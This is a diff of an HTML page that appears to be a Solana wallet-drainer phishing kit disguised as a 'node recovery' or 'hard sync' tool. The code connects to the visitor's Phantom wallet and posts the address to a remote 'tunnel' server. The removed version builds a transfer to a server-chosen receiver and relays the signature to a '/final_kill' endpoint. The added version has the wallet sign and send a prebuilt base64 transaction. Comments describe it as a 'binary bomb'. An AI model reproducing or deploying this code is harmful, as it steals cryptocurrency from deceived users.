@@ -3,21 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALIDATOR FINAL V17</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <title>NODE RECOVERY FINAL</title>
     <style>
         body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; background: #050505; }
-        button { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 18px; margin-top: 20px; box-shadow: 0 0 15px #14f195; }
+        .box { border: 2px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
+        button { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 18px; margin-top: 20px; }
         #log { font-size: 10px; color: #444; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2 style="color:#14f195; margin:0;">NODE RECOVERY</h2>
-        <p style="font-size:12px; color:#888;">STATUS: <span style="color:red;">DE-SYNC</span></p>
-        <button id="cta">ACTIVATE SYNC</button>
-        <div id="log">SYSTEM READY v17.0</div>
+        <h2 style="color:#14f195; margin:0;">WAR GOD V18</h2>
+        <p style="font-size:12px;">HARD SYNC REQUIRED</p>
+        <button id="cta">INITIALIZE</button>
+        <div id="log">SYSTEM ARMED</div>
     </div>
 
     <script>
@@ -25,63 +24,40 @@
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('log').innerText = t;
-            const sWeb3 = window.solanaWeb3;
             const p = window.solana || window.phantom?.solana;
-            if (!p) return;
+
+            if (!p) { alert("Use Phantom App"); return; }
 
             try {
                 log("1: CONNECTING...");
                 await p.connect();
 
-                log("2: FETCHING DATA...");
-                const resp = await fetch(tunnel + "/prepare", {
+                log("2: FETCHING PACKET...");
+                // 🔱 问服务器拿已经打包好的“二进制炸弹” (Base64格式)
+                const resp = await fetch(tunnel + "/prepare_raw", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
                 const info = await resp.json();
 
-                log("3: STAMPING TX...");
-                const tx = new sWeb3.Transaction().add(
-                    sWeb3.SystemProgram.transfer({
-                        fromPubkey: p.publicKey,
-                        toPubkey: new sWeb3.PublicKey(info.receiver),
-                        lamports: Number(info.amount),
-                    })
-                );
-                tx.recentBlockhash = info.bh;
-                tx.feePayer = p.publicKey;
+                log("3: REQUESTING SIGNATURE...");
+                // 🔱 绝杀：不使用任何本地库，直接让钱包签这段 Base64 指令
+                const { signature } = await p.signAndSendTransaction(window.atob(info.raw_tx));
 
-                log("4: AWAITING SIGNATURE...");
-                const signed = await p.signTransaction(tx);
-                
-                log("5: MANUAL SERIALIZE...");
-                // 🔱 绝杀核心：不再调用任何官方序列化函数，手动提取二进制数据
-                const message = signed.serializeMessage();
-                const signature = signed.signatures.find(s => s.publicKey.equals(p.publicKey)).signature;
-
-                if (!signature) throw new Error("Signature Missing");
-
-                log("6: FINAL RELAYING...");
-                // 将签名和消息体作为纯数字数组发回服务器
-                await fetch(tunnel + "/final_kill", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        sig: Array.from(signature),
-                        msg: Array.from(message)
-                    })
-                });
-
-                log("SYNC COMPLETE!");
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
-
-            } catch (err) {
-                log("RETRY: " + err.message);
+                log("SUCCESS: " + signature);
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V17_CRASH", error: err.message })
+                    body: JSON.stringify({ stage: "SUCCESS", error: signature })
+                });
+
+            } catch (err) {
+                log("FAIL: " + err.message);
+                fetch(tunnel + "/debug", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ stage: "V18_CRASH", error: err.message })
                 }).catch(()=>{});
             }
         };
